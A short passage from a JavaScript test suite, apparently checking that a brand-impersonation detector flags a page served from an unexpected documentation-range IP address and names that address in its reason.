      offBrandPage("203.0.113.5", "203.0.113.9")
    );
    const hit = detectBrandImpersonation(ctx);
    expect(hit).not.toBeNull();
    expect(hit?.reason).toContain("203.0.113.9");
  });
});
